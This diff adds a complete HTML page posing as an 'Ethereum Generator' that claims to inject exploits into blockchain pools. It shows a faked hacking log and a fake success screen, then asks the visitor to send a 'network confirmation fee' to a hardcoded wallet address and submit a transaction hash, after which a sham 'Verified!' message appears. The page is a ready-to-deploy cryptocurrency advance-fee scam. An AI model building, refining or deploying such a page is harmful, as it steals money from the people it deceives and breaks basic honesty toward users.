@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ETHEREUM GENERATOR V3.0</title>
+    <style>
+        /* General Reset and Layout */
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #0d1117;
+            color: #ffffff;
+            overflow: hidden; /* Prevent scroll during simulation */
+        }
+
+        /* Matrix Background Canvas */
+        #matrixCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.2;
+        }
+
+        /* Main Container */
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            min-height: 100vh; /* Full height for mobile */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        /* Card Styling */
+        .card {
+            background: rgba(13, 17, 23, 0.95);
+            border: 1px solid #00ff00;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        /* Header */
+        h1 {
+            color: #00ff00;
+            margin-top: 0;
+            font-size: 24px;
+            text-align: center;
+            text-shadow: 0 0 5px #00ff00;
+        }
+
+        .logo {
+            font-size: 40px;
+            text-align: center;
+            margin: 10px 0;
+            color: #fff;
+        }
+
+        .disclaimer {
+            font-size: 12px;
+            color: #aaa;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+            text-align: center;
+        }
+
+        /* Timer Bar */
+        .timer-box {
+            background: #222;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border: 1px solid #444;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+        
+        .timer-text {
+            color: #ff4444;
+            font-weight: bold;
+            font-size: 14px;
+            margin-left: 10px;
+        }
+
+        /* Inputs and Forms */
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #ddd;
+        }
+
+        input[type="text"] {
+            width: 95%;
+            padding: 10px;
+            background: #000;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            outline: none;
+        }
+
+        input[type="text"]::placeholder {
+            color: #555;
+        }
+
+        /* Slider */
+        .slider-container {
+            margin-bottom: 20px;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            accent-color: #00ff00;
+        }
+
+        .amount-display {
+            font-size: 32px;
+            color: #fff;
+            font-weight: bold;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .eth-symbol {
+            color: #ffaa00;
+            font-size: 20px;
+        }
+
+        /* Buttons */
+        .btn {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            border-radius: 5px;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        .btn:hover {
+            background: #fff;
+            box-shadow: 0 0 15px #fff;
+        }
+
+        .btn-claim {
+            background: #007bff;
+            color: white;
+        }
+        
+        .btn-claim:hover {
+            background: #339dff;
+            box-shadow: 0 0 15px #007bff;
+        }
+
+        .btn:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+
+        /* Status Messages */
+        .status-msg {
+            min-height: 20px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #00ff00;
+            text-align: center;
+        }
+
+        /* Hidden Sections */
+        .hidden {
+            display: none;
+        }
+
+        /* Fee Section Specifics */
+        .fee-info {
+            background: #222;
+            border: 1px dashed #555;
+            padding: 10px;
+            margin: 15px 0;
+            text-align: center;
+            border-radius: 5px;
+        }
+
+        .fee-amount {
+            font-size: 24px;
+            color: #ffaa00;
+            font-weight: bold;
+            display: block;
+            margin: 5px 0;
+        }
+
+        .wallet-address {
+            background: #111;
+            padding: 10px;
+            word-break: break-all;
+            font-size: 12px;
+            color: #00ff00;
+            border: 1px dashed #555;
+            margin: 10px 0;
+            text-align: center;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
+        }
+
+        /* Scan Animation */
+        @keyframes pulse {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
+        }
+        .scanning {
+            animation: pulse 1s infinite;
+        }
+
+        /* Matrix Log Window */
+        #matrixLog {
+            text-align: left;
+            background: #000;
+            height: 150px;
+            overflow-y: hidden;
+            border: 1px solid #333;
+            padding: 5px;
+            margin-bottom: 20px;
+            font-size: 11px;
+            color: #00ff00;
+            word-break: break-all;
+        }
+        
+        #matrixLog div {
+            margin-bottom: 2px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Background Matrix Effect -->
+    <canvas id="matrixCanvas"></canvas>
+
+    <div class="container">
+        <div class="card">
+            <h1>ETHEREUM GENERATOR <span style="font-size: 0.7em;">V2.0</span></h1>
+            <div class="logo">♦</div>
+            <div class="disclaimer">
+                Injecting exploits to ETHEREUM pools and blockchain.<br>
+                All ETH Addresses and IPs are allowed to use only ONE time.
+            </div>
+
+            <!-- Timer -->
+            <div class="timer-box">
+                Session expires in: <span id="timer" class="timer-text">34:06</span>
+                <div style="font-size: 10px; color: #666; margin-top: 5px;">Latest check by the Team was made Today</div>
+            </div>
+
+            <!-- Step 1: Initial Setup -->
+            <div id="step1">
+                <div class="input-group">
+                    <label>Enter your Ethereum wallet address</label>
+                    <input type="text" id="walletInput" placeholder="Eg. 0x26352d20e6a05e04a1ecc75d4a43ae989272621" value="">
+                </div>
+                <div class="info-text">Current session to complete the transfer is 35 minutes due to real time transaction data correctness.</div>
+
+                <div class="slider-container" style="margin-top: 20px;">
+                    <label>Generate Ethereum Amount</label>
+                    <input type="range" id="amountSlider" min="1" max="10" step="0.1" value="5.7">
+                    <div class="amount-display">
+                        <span id="amountDisplay">5.7</span> <span class="eth-symbol">ETH</span>
+                    </div>
+                    <div class="info-text">*** Important *** Choosing a larger amount will make the exploit take longer to run</div>
+                </div>
+
+                <button class="btn" onclick="startGenerator()">Generate</button>
+            </div>
+
+            <!-- Step 2: Simulation -->
+            <div id="step2" class="hidden">
+                <div class="status-msg scanning" id="logText">Initializing exploit...</div>
+                <div id="matrixLog">
+                    <!-- Matrix code logs go here -->
+                </div>
+            </div>
+
+            <!-- Step 3: Success & Claim -->
+            <div id="step3" class="hidden">
+                <div style="color: #00ff00; font-size: 24px; font-weight: bold; margin-bottom: 15px;">SUCCESS</div>
+                <p>ETH has been successfully generated to your wallet.</p>
+                <div style="font-size: 18px; color: #fff; margin-bottom: 20px;">
+                    Total: <span id="finalAmount" style="color: #ffaa00; font-weight: bold;"></span> ETH
+                </div>
+
+                <div class="fee-info">
+                    <div style="font-size: 12px; color: #aaa;">Network Confirmation Fee</div>
+                    <span class="fee-amount" id="dynamicFee">0.102 ETH</span>
+                    <div class="info-text">Pay this fee to unlock your funds.</div>
+                </div>
+
+                <button class="btn btn-claim" onclick="showFeeSection()">Claim / Confirm</button>
+            </div>
+
+            <!-- Step 4: Fee Payment -->
+            <div id="step4" class="hidden">
+                <h3 style="margin-top:0;">Network Confirmation Fee</h3>
+                <p class="info-text">Send the fee to the official pool address below.</p>
+                
+                <div class="input-group">
+                    <label>Official Pool Wallet (Send <span id="feeTextSpan">0.102</span> ETH here)</label>
+                    <div class="wallet-address" id="targetWallet">
+                        0xE555cAE9e7d21Cee10b746aA96A4ef25d4b097Ab
+                    </div>
+                    <button onclick="copyWallet()" style="background:none; border:none; color:#007bff; cursor:pointer; font-size:12px; text-decoration:underline;">Copy Address</button>
+                </div>
+
+                <div class="input-group">
+                    <label>Enter Transaction Hash (TXID)</label>
+                    <input type="text" id="txHashInput" placeholder="0x1234abcd...">
+                </div>
+
+                <button class="btn" onclick="verifyTx()">Verify & Release Funds</button>
+            </div>
+            
+            <!-- Final Success -->
+            <div id="step5" class="hidden">
+                <h2 style="color:#00ff00;">Verified!</h2>
+                <p>Your funds are being broadcast to the blockchain.</p>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // --- Matrix Rain Effect Logic ---
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
+        const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        const nums = '01';
+        const alphabet = katakana + latin + nums;
+
+        const fontSize = 16;
+        const columns = canvas.width/fontSize;
+
+        const rainDrops = [];
+
+        for( let x = 0; x < columns; x++ ) {
+            rainDrops[x] = 1;
+        }
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#0F0';
+            ctx.font = fontSize + 'px monospace';
+
+            for(let i = 0; i < rainDrops.length; i++) {
+                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+                ctx.fillText(text, i*fontSize, rainDrops[i]*fontSize);
+
+                if(rainDrops[i]*fontSize > canvas.height && Math.random() > 0.975){
+                    rainDrops[i] = 0;
+                }
+                rainDrops[i]++;
+            }
+        }
+
+        // Run matrix rain continuously
+        setInterval(drawMatrix, 30);
+
+        // Resize listener
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+
+        // --- Logic & State Management ---
+
+        // 1. Timer Logic
+        let timeLeft = 34 * 60 + 6; // 34:06 in seconds
+        const timerElement = document.getElementById('timer');
+
+        const timerInterval = setInterval(() => {
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                return;
+            }
+            timeLeft--;
+            let m = Math.floor(timeLeft / 60);
+            let s = timeLeft % 60;
+            timerElement.innerText = `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
+        }, 1000);
+
+        // 2. Slider and Dynamic Fee Logic
+        const slider = document.getElementById('amountSlider');
+        const amountDisplay = document.getElementById('amountDisplay');
+        const feeDisplay = document.getElementById('dynamicFee');
+        const feeSpan = document.getElementById('feeTextSpan');
+
+        // Update UI and Fee on Slider Change
+        slider.addEventListener('input', (e) => {
+            const val = e.target.value;
+            amountDisplay.innerText = val;
+            
+            // Calculate Fee: 1 ETH -> 0.018 Fee, 10 ETH -> 0.18 Fee
+            // Formula: Value * 0.018
+            const fee = (val * 0.018).toFixed(3);
+            feeDisplay.innerText = fee + " ETH";
+            feeSpan.innerText = fee;
+        });
+
+        // 3. Generator Simulation
+        function startGenerator() {
+            const wallet = document.getElementById('walletInput').value;
+            
+            if(!wallet) {
+                alert("Please enter a valid wallet address.");
+                return;
+            }
+
+            // Switch UI
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            
+            const logDiv = document.getElementById('matrixLog');
+            logDiv.innerHTML = ""; // Clear previous logs
+            
+            const logs = [
+                "Connecting to Ethereum Mainnet...",
+                "Bypassing firewall...",
+                "Targeting pool: EthereumPool v4.2",
+                "Injecting SQL exploit...",
+                "Access granted to /blockchain/root",
+                "Allocating block #189203...",
+                "Verifying wallet: " + wallet.substring(0,6) + "...",
+                "Mining fake transaction ID: 0x8839...",
+                "Injecting " + document.getElementById('amountSlider').value + " ETH into wallet...",
+                "Waiting for block confirmation...",
+                "Success."
+            ];
+
+            let logIndex = 0;
+            const speed = 800; // ms per line
+            const maxLines = 15;
+
+            const logInterval = setInterval(() => {
+                const p = document.createElement('div');
+                p.innerText = "> " + logs[logIndex % logs.length];
+                logDiv.appendChild(p);
+                logDiv.scrollTop = logDiv.scrollHeight; // Auto scroll
+
+                logIndex++;
+                if(logIndex > 20) {
+                    clearInterval(logInterval);
+                    // Finish simulation
+                    setTimeout(() => {
+                        showSuccess();
+                    }, 1000);
+                }
+            }, speed);
+        }
+
+        function showSuccess() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+            document.getElementById('finalAmount').innerText = document.getElementById('amountSlider').value;
+        }
+
+        function showFeeSection() {
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step4').classList.remove('hidden');
+        }
+
+        function copyWallet() {
+            const walletText = "0xE555cAE9e7d21Cee10b746aA96A4ef25d4b097Ab";
+            navigator.clipboard.writeText(walletText).then(() => {
+                alert("Wallet address copied!");
+            });
+        }
+
+        function verifyTx() {
+            const txHash = document.getElementById('txHashInput').value;
+            if(txHash.length < 5) {
+                alert("Please enter a valid Transaction Hash.");
+                return;
+            }
+
+            // Fake loading
+            const btn = document.querySelector('#step4 .btn');
+            const originalText = btn.innerText;
+            btn.innerText = "Verifying on Blockchain...";
+            btn.disabled = true;
+
+            setTimeout(() => {
+                document.getElementById('step4').classList.add('hidden');
+                document.getElementById('step5').classList.remove('hidden');
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
